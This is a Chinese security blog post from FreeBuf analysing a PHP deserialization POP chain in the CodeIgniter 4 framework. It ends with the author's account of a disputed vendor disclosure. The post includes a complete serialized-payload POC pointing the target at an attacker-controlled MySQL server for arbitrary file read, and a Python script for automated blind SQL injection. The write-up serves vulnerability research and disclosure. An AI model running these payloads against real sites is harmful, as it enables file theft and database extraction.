**HW期间，为防范钓鱼，即日起FreeBuf将取消投稿文章的一切外部链接。给您带来的不便，敬请谅解~**

##  **0x00 前言**

CI框架作为PHP国外流行的框架，笔者有幸的挖掘到了它的反序列化POP链，其漏洞影响版本为4.*版本。

![](https://image.3001.net/images/20210412/1618190514_6073a0b2586fd8a4f14ba.png!small)

文末有笔者与该厂商的一些“小故事”。

##  **0x01 POP链分析**

当然，反序列化漏洞需要反序列化操作的支撑，因此，笔者定义了一个触发该反序列化漏洞的控制器，定义于：/app/Controllers/Home.php

主要内容于:

    
    
    <?php namespace App\Controllers;
    
    class Home extends BaseController
    {
        public function index()
        {
            unserialize($_GET['a']);
        }
    }

__destruct魔术方法为反序列化漏洞最有效的方法，我们可以全局搜索一下__destruct魔术方法的定义。

![](https://image.3001.net/images/20210412/1618190562_6073a0e2b2b5eeb67e999.png!small)

可以看到在/system/Cache/Handlers/RedisHandler.php中的__destruct魔术方法中，$this->redis成员属性没有任何实例判断，直接调用close方法，那么$this->redis非常灵活，它可以是任意类的实例化对象，那么我们可以调用任意对象的close()方法。

全局搜索close()方法：

![](https://image.3001.net/images/20210412/1618190582_6073a0f6b577c98c01515.png!small)

通过全局搜索可以看到，在/system/Session/Handlers/MemcachedHandler.php文件中，存在一个close()方法，在264行的isset($this->memcached)为成员属性，是可控的，随后在266行判断$this->lockKey是否存在，如果存在，则调用$this->memcached->delete($this->lockKey)方法，再次全局搜索delete方法。

![](https://image.3001.net/images/20210412/1618190600_6073a108db49ab80f2889.png!small)

通过全局搜索可以看到，在system/Model.php中定义了delete方法，虽然接收两个参数，有幸的是CI框架将第二个参数给予了默认参数：$purge
= false。

![](https://image.3001.net/images/20210412/1618190617_6073a119daf902f70b3b1.png!small)

在之前的$this->memcached->delete($this->lockKey)虽然只传递进来一个参数，但是这种写法将无视PHP版本号，将此代码继续运行下去。

![](https://image.3001.net/images/20210412/1618190635_6073a12bbc87be4efc4fd.png!small)

921行调用了$this->builder()方法，我们看一下builder方法的定义。

![](https://image.3001.net/images/20210412/1618190654_6073a13e94a1318ffe2d9.png!small)

在1198的赋值操作中可以看到 $table 是可控的，在1206行中进行赋值$this->db->table($table)
的返回内容，我们注意到在1201行进行检测了$this->db->table的所属类，如果我们想要代码继续往下执行，我们 **这里只能将$this->db赋值为BaseConnection的实例化对象**。

因为在1206行有调用BaseConnection的table成员方法，我们在
/system/Database/BaseConnection.php中查找一下table。

![](https://image.3001.net/images/20210412/1618190686_6073a15e668599c658eaa.png!small)

可以看到971行的str_replace操作，当前的类名为BaseConnection，替换后为BaseBuilder类，随后进行 new
BaseBuilder操作，以$tableName以及$this传递进去了，需要注意的是，$tableName是可控的。

找到 /system/Database/BaseBuilder.php 文件，并且搜索__construct魔术方法。如图：

![](https://image.3001.net/images/20210412/1618190709_6073a175677cd0320f2ff.png!small)

274行将可控的$tableName传递进from方法了，我们看一下from方法的定义。

![](https://image.3001.net/images/20210412/1618190724_6073a1845a44346e56164.png!small)

CI框架将$from强制转换为array类型，并且如果找不到“逗号”就会将$from传递到$this->trackAliases方法中。

我们看一下trackAliases方法的定义。

![](https://image.3001.net/images/20210412/1618190742_6073a1964e493fa4cb7e7.png!small)

可以看到trackAliases只会处理“ **$from为数组、$from存在逗号、$from存在空格**
”的情况，那么该函数我们可以先将其忽略，继续往下审计。

![](https://image.3001.net/images/20210412/1618190763_6073a1abe6d1bf625d4cd.png!small)

可以看到，调用$this->db->protectIdentifiers方法。$this->db为BaseConnection类的实例，我们查找BaseConnection下的protectIdentifiers方法。如图：

![](https://image.3001.net/images/20210412/1618190779_6073a1bb52dab7b90082b.png!small)

其中代码逻辑贴在图中，我们继续往下审计即可。

![](https://image.3001.net/images/20210412/1618190795_6073a1cbbda08ce164005.png!small)

我们回到调用处，查看一下往下的逻辑。

![](https://image.3001.net/images/20210412/1618190811_6073a1dbcc9c18604cb71.png!small)

注意924行调用了BaseBuilder下的whereIn方法，我们看一下这个方法做了一些什么操作。

![](https://image.3001.net/images/20210412/1618190831_6073a1ef81f9d0fcf5337.png!small)

可以看到$key再次传入了_whereIn方法，我们看一下_whereIn方法都做了一些什么操作。

![](https://image.3001.net/images/20210412/1618190847_6073a1fff10ab68ab3bdd.png!small)

随后直接放入$whereIn这么大的一个数组中，充当Where判断的Key值。

那么无疑这里是存在一个SQL注入漏洞的。我们不着急，回到Model.php继续往下通读。

![](https://image.3001.net/images/20210412/1618190865_6073a2114d416de43cc8a.png!small)

我们把重点放在952行调用的BaseBuilder下的delete方法，如图：

![](https://image.3001.net/images/20210412/1618190879_6073a21f06e46e839ea41.png!small)

2834行调用了resetWrite方法，跟踪一下看看。

![](https://image.3001.net/images/20210412/1618190895_6073a22fcd78a8d706427.png!small)

调用了$this->resetRun，继续跟踪。

![](https://image.3001.net/images/20210412/1618190912_6073a24048d56d322d6c5.png!small)

我们可以看到，只是用来设置键值的。那么我们看一下2837行的$this->db->query($sql, $this->binds, false)方法。

找到BaseConnection下的query方法，如图：

![](https://image.3001.net/images/20210412/1618190929_6073a2515abeae0fb9655.png!small)

继续跟进initialize方法，如图：

![](https://image.3001.net/images/20210412/1618190948_6073a2644e1947d1b73b2.png!small)

可以看到，调用了$this->connect($this->pConnect)方法，我们查找一下connect方法，如图：

![](https://image.3001.net/images/20210412/1618190963_6073a273d4b78e39bc731.png!small)

我们可以看到，前面存在abstract关键字，那么我们全局搜索一下，extends BaseConnection。

如图：

![](https://image.3001.net/images/20210412/1618190980_6073a284537d850d0f618.png!small)

我们打开system/Database/MySQLi/Connection.php文件，查找connect方法，如图：

![](https://image.3001.net/images/20210412/1618190996_6073a294f2ce055c29980.png!small)

这里需要注意的是118行$this->strictOn以及140行$this->encrypt不要去定义。

下面就是我们期待已久的Mysql链接操作了。这里可以利用“MySQL服务端恶意读取客户端文件漏洞”来进行任意文件读取。

![](https://image.3001.net/images/20210412/1618191012_6073a2a43efebdd2e9fba.png!small)

这一系列操作完成之后我们回到$this->initialize()魔术方法调用处。继续往下审计。

![](https://image.3001.net/images/20210412/1618191028_6073a2b4126d41e5c017a.png!small)

实例化CodeIgniter\Database\Query类并调用它下面的getQuery()方法。

在system/Database/query.php找到该类，如图：

![](https://image.3001.net/images/20210412/1618191042_6073a2c20fac0c6ea013a.png!small)

可以看到是来解析占位符的。

调用了compileBinds方法，跟进查看。

![](https://image.3001.net/images/20210412/1618191062_6073a2d6d354ccc4ba344.png!small)

跟进404行的matchNamedBinds方法确认。

![](https://image.3001.net/images/20210412/1618191077_6073a2e5f1543bdf47bbd.png!small)

可以从图中看到笔者的猜想是没错的。

那么我们回到BaseConnection的query方法，继续观察。

![](https://image.3001.net/images/20210412/1618191092_6073a2f45c9f6b934c711.png!small)

可以看到调用了一个simpleQuery方法，我们跟进。

![](https://image.3001.net/images/20210412/1618191107_6073a303c9119a59d0231.png!small)

又传入了execute方法，再次跟进，如图：

![](https://image.3001.net/images/20210412/1618191123_6073a313180ffdce030c2.png!small)

可以看到又是抽象方法，那么我们看看是谁继承了BaseConnection，查找：

![](https://image.3001.net/images/20210412/1618191136_6073a320a50b793690763.png!small)

跟进并查找execute方法的定义。

![](https://image.3001.net/images/20210412/1618191156_6073a33464ec40ef62273.png!small)

此时我们可以看到$this->connID->query($this->prepQuery($sql))，其实$this->connID已经是PHP的Mysqli原生类了，这里我们需要跟进prepQuery方法，看他到底做了一些什么操作。  
![](https://image.3001.net/images/20210412/1618191172_6073a344d7a9a836a37aa.png!small)

这里$this->deleteHack是可控的，我们无视即可，那么prepQuery方法等同于什么也没干，直接带进了Mysqli::query()
方法，根据我们之前审计出的Model类的primaryKey成员属性可以进行SQL注入（WHERE 条件处）。

到这里笔者就没有再次往下审计了，我们的目的只是 任意文件读取+发送SQL语句。

反序列化的结果CI框架是百分百会抛出异常的，如图：

![](https://image.3001.net/images/20210412/1618191189_6073a3557c38463b10ce1.png!small)

再往下读下去也没有什么可以利用的价值了。

##  **0x02 通过CI定义的函数触发反序列化**

在我们之前分析POP链时，我们使用了unserialize函数来进行演示，那么在CI框架中是否存在unserialize使用不当的问题呢？答案是肯定的。

我们看一下CI框架定义的old方法，如图：

![](https://image.3001.net/images/20210413/1618271153_6074dbb1a0d954c9e3940.png!small)

我们可以看到，782-786行使用“strpos($value, 'a:') === 0 || strpos($value, 's:') ===
0”来让old函数反序列化出必须为“数组/字符串”，但是这种手法是消极的，如果我们反序列化的内容为“a:1:{i:0; ** **O:...****
}”这种情况还是可以进入到__destruct跳板，然后被利用。

那么我们看一下old函数第768行与770行的逻辑。

> $request = Services::request();
>
> $value = $request->getOldInput($key);

我们看一下Services类下的request静态方法。

![](https://image.3001.net/images/20210413/1618271188_6074dbd4572f886a168ba.png!small)

我们可以看到，该方法返回了IncomingRequest类的实例，那么$value =
$request->getOldInput($key);也就是调用IncomingRequest实例下的getOldInput方法了，我们看一下该方法做了一些什么操作。  
![](https://image.3001.net/images/20210413/1618271206_6074dbe6e0bb3a0f297a8.png!small)

可以看到，如果$_SESSION['_ci_old_input']的值不为空，那么该方法就可以返回$_SESSION['_ci_old_input']['post'][$key]与$_SESSION['_ci_old_input']['get'][$key]。

那么问题来了，我们如何将$_SESSION['_ci_old_input']['post'][$key]与$_SESSION['_ci_old_input']['get'][$key]可控呢？

我们全局搜索：'_ci_old_input'，如图：

![](https://image.3001.net/images/20210413/1618271223_6074dbf7312fb52019df3.png!small)

我们可以看到在/system/HTTP/RedirectResponse.php文件中有提到_ci_old_input，那么我们看一下第125行的$session
= $this->ensureSession();，跟进ensureSession方法。如图：

![](https://image.3001.net/images/20210413/1618271240_6074dc085763847372a32.png!small)

跟进：

![](https://image.3001.net/images/20210413/1618271254_6074dc16e4f71cde8cb50.png!small)

这个方法只是用来对session进行一系列操作的，我们不需要管他，我们回过头来继续往下看。

![](https://image.3001.net/images/20210413/1618271270_6074dc266c9945cb7fd91.png!small)

下面的132行调用了setFlashdata方法，根据笔者猜想是用来设置$_SESSION[_ci_old_input]的值，我们跟进setFlashdata看一下逻辑。

![](https://image.3001.net/images/20210413/1618271286_6074dc36efe2a6a7ae914.png!small)

在/system/Session/Session.php中的666行可以看到调用了set方法，我们跟进set方法。

![](https://image.3001.net/images/20210413/1618271302_6074dc46bb1b9e0f375fe.png!small)

看来笔者的猜想是没错的。

那么我们将/app/Controllers/Home.php控制器定义为：

> <?php namespace App\Controllers;
>
>  
>
>
> class Home extends BaseController
>
> {
>
> public function index()
>
> {
>
> redirect()->withInput();//设置$_SESSION['_ci_old_input']['get'][a]的值
>
> old('a');//得到$_SESSION['_ci_old_input']['get'][a]的值，并进行反序列化操作
>
> }
>
> }

的效果与

> <?php namespace App\Controllers;
>
>  
>
>
> class Home extends BaseController
>
> {
>
> public function index()
>
> {
>
> unserialize($_GET[a]);
>
> }
>
> }

的效果是一模一样的。只是我们编写POC时，redirect()->withInput() && old('a');
这种方式，我们需要注意反序列化的结果一定是一个数组，为了POC的通用性，笔者将该POC生成的返回结果为数组。

##  **0x03 POC编写 &&环境依赖**

CI框架建立于PHP>=7.2版本，在这些版本中，PHP对属性修饰符不太敏感，所以我们的POC类中的所有成员属性的对象修饰符都定义为了public。

但是“MySQL服务端恶意读取客户端文件漏洞”在PHP7.3版本的Mysqli链接操作中被刻意注意到了这一点。所以
**该漏洞只能在PHP7.2.x版本中进行利用** 。

POC如下：

> <?php  
> namespace CodeIgniter\Database\MySQLi;  
> class Connection{  
> public $hostname = ''; # The attacker's MySQL IP address  
> public $port = ''; # The attacker's MySQL Port  
> public $database = ''; # The attacker's MySQL Databases  
> public $username = 'root'; # The attacker's MySQL UserName  
> public $password = 'root'; # The attacker's MySQL Password  
> public $charset = 'utf8'; # utf8  
> public $escapeChar = '';  
> public $pretend = false;  
> }
>
> namespace CodeIgniter;  
> class Model{  
> public $db;  
> public $table = "mysql.user";  
> public $primaryKey = "1=(case when (select (select group_concat(table_name)
> from information_schema.tables where table_schema=database()) regexp '^aa')
> then sleep(1) else 0 end)#";  
> public function __construct($db){  
> $this->db = $db;  
> }  
> }
>
>  
> namespace CodeIgniter\Session\Handlers;  
> class MemcachedHandler{  
> public $lockKey = '123';  
> public $memcached = 'a';  
> public function __construct($memcached){  
> $this->memcached = $memcached;  
> }  
> }
>
> namespace CodeIgniter\Cache\Handlers;  
> class RedisHandler{  
> public $redis;  
> public function __construct($redis){  
> $this -> redis = $redis;  
> }  
> }
>
> $a = array(new RedisHandler(new
> \CodeIgniter\Session\Handlers\MemcachedHandler(new \CodeIgniter\Model(new
> \CodeIgniter\Database\MySQLi\Connection()))));  
> echo urlencode(serialize($a));

##  **0x04 漏洞演示**

###  ** **一、任意文件读取****

需要用到的rogue_mysql_server.py脚本GitHub：https://github.com/Gifts/Rogue-MySql-Server

  1. 配置POC文件

配置恶意Mysql主机IP（攻击者外网IP）：![](https://image.3001.net/images/20210412/1618191290_6073a3baa7dc5ac9f2af5.png!small)

  2. 配置py脚本

![](https://image.3001.net/images/20210412/1618191307_6073a3cbefea00fe1dab7.png!small)

  3. 配置完毕后攻击机上运行py脚本

![](https://image.3001.net/images/20210412/1618191323_6073a3dbd2d0e656090cc.png!small)

  4. 生成Payload

![](https://image.3001.net/images/20210412/1618191343_6073a3ef939d26dee3fb8.png!small)

  5. 攻击受害机的反序列化点

![](https://image.3001.net/images/20210412/1618191360_6073a400abf960484aed7.png!small)

  6. 读取到C:/Windows/win.ini的内容

![](https://image.3001.net/images/20210412/1618191375_6073a40f4082c373af3bc.png!small)

###  ** **二、SQL注入****

我们可以通过任意文件读取漏洞读取出数据库账号密码，然后再进行SQL注入。

![](https://image.3001.net/images/20210412/1618191442_6073a45283d2551914cc8.png!small)

生成Payload后发送：

![](https://image.3001.net/images/20210412/1618191458_6073a462d6ce584aa582a.png!small)

成功睡眠一秒，但是这样的注入对于我们来说是很麻烦的，这里我们放在实战中需要借助于Python脚本来进行批量注入。

具体Python脚本实现思路为：

![](https://image.3001.net/images/20210412/1618191475_6073a47363bf2b3be9a0a.png!small)

因为我们要与Python进行交互，那么我们修改PHP-POC的内容为：

> <?php  
> namespace CodeIgniter\Database\MySQLi;  
> class Connection{  
> public $hostname = '127.0.0.1'; # The attacker's MySQL IP address  
> public $port = '3306'; # The attacker's MySQL Port  
> public $database = 'laravel'; # The attacker's MySQL Databases  
> public $username = 'root'; # The attacker's MySQL UserName  
> public $password = 'root'; # The attacker's MySQL Password  
> public $charset = 'utf8'; # utf8  
> public $escapeChar = '';  
> public $pretend = false;  
> }
>
> namespace CodeIgniter;  
> class Model{  
> public $db;  
> public $table = "mysql.user";  
> public $primaryKey = "1=(case when (select (select group_concat(table_name)
> from information_schema.tables where table_schema=database()) regexp '^aa')
> then sleep(1) else 0 end)#";  
> public function __construct($db){  
> $this->db = $db;  
>  **$payload = $_GET['payload'];**  
>  **if(isset($payload)){**  
>  **$this- >primaryKey = $payload;**  
> }  
> }  
> }
>
>  
> namespace CodeIgniter\Session\Handlers;  
> class MemcachedHandler{  
> public $lockKey = '123';  
> public $memcached = 'a';  
> public function __construct($memcached){  
> $this->memcached = $memcached;  
> }  
> }
>
> namespace CodeIgniter\Cache\Handlers;  
> class RedisHandler{  
> public $redis;  
> public function __construct($redis){  
> $this -> redis = $redis;  
> }  
> }
>
> $a = array(new RedisHandler(new
> \CodeIgniter\Session\Handlers\MemcachedHandler(new \CodeIgniter\Model(new
> \CodeIgniter\Database\MySQLi\Connection()))));  
> echo **serialize($a);**

编写PythonPoc为：

> import requests
>
> PHP_POC = 'http://www.ci.com/hack.php?payload=' # 这里填入 PHP 的 POC  
> CI_HTTP = 'http://ci.com/public/index.php?a=' # 填入CI站的反序列化点
>
> data = ''  
> k = 1  
> while True:  
> bins = ''  
> for i in range(1, 8):  
> payload = "1=if(substr(lpad(bin(ascii(substr((select
> group_concat(table_name) from information_schema.tables where
> table_schema=database()),%s,1))),7,0),%s,1)=1,sleep(1),0) -- "%(k,i)  
> SeriaText = requests.get(PHP_POC + payload).text  
> try:  
> requests.get(CI_HTTP + SeriaText, timeout=1,
> proxies={'http':'127.0.0.1:8080'})  
> bins += '0'  
> except Exception as res:  
> bins += '1'  
> if bins == '0000000':  
> break  
> else:  
> data += chr(int(bins, 2))  
> k += 1  
> print(data)

逐渐爆出表名:

![](https://image.3001.net/images/20210412/1618191537_6073a4b1525144d796644.png!small)

##  **0x05 与TP3.2.3对比思考**

ThinkPHP3.2.3也存在类似的问题，参考：http://cn-sec.com/archives/236781.html

它们两者漏洞的区别在于：

CI框架使用了mysql_init() 来进行数据库链接，而TP则使用了PDO。这里涉及到了堆叠与非堆叠问题。

CI框架的SQL注入处于WHERE条件，ThinkPHP3.2.3的SQL注入处于表名。

CI框架没有DEBUG模式，很难进行报错注入，而ThinkPHP存在DEBUG模式，可以进行报错注入。

CI框架写代码有定义方法默认值的习惯，这样在我们的反序列化中每个跳板显得非常的圆润，而TP3.2.3没有定义默认值的习惯，这里需要降低PHP版本，来实现反序列化。

CI框架只允许运行在PHP7.2及往上版本，而MySQL恶意服务器文件读取漏洞只能运行在PHP<7.3版本，所以本次漏洞挖掘只可以运行在刚刚好的PHP7.2.x。而ThinkPHP3.2.3可以运行在PHP5与PHP7版本，ThinkPHP3.2.3的反序列化链路只能运行在PHP5.x上，放在PHP7.x会报错。

  

文章中将反序列化跳板直接写上了,实际挖洞过程不忍直视...

##  **0x06 “凉心”框架CI**

笔者在4月9号挖掘到了该反序列化漏洞，但Mysql恶意服务器只适用于PHP7.2.*版本，在4月9号笔者通过hackerone向厂商提交了该漏洞，搞不好还可以申请一个CVE编号呢。如图（翻译来的）：

![](https://image.3001.net/images/20210414/1618387883_6076a3ab77391ca7f8621.png!small)

通过厂商的驳回，笔者当然向CNVD上交该漏洞了。

但CNVD那里今天笔者突然得到了验证失败的“驳回”。

如图：

![](https://image.3001.net/images/20210414/1618387914_6076a3cadf807be2570c5.png!small)

随后笔者去录制验证视频时，发现漏洞被“修补”？

我们通过CI框架的官网看到，是适用于PHP7.2.*版本的，如图：

![](https://image.3001.net/images/20210414/1618387936_6076a3e0aff698aa11045.png!small)

可是为什么提交给该厂商之前PHP7.2.*可以运行，而厂商驳回后，PHP7.2.*则无法运行了？相信大家心中也已经有了答案。

通过github的最后修改日期我们可以看到该厂商私自修复漏洞的日期。

![](https://image.3001.net/images/20210414/1618388031_6076a43f88a9675c4b85d.png!small)

这是一次痛心的挖洞提交过程， **请问安全行业从业者，白帽子们的心血都去哪里了？**

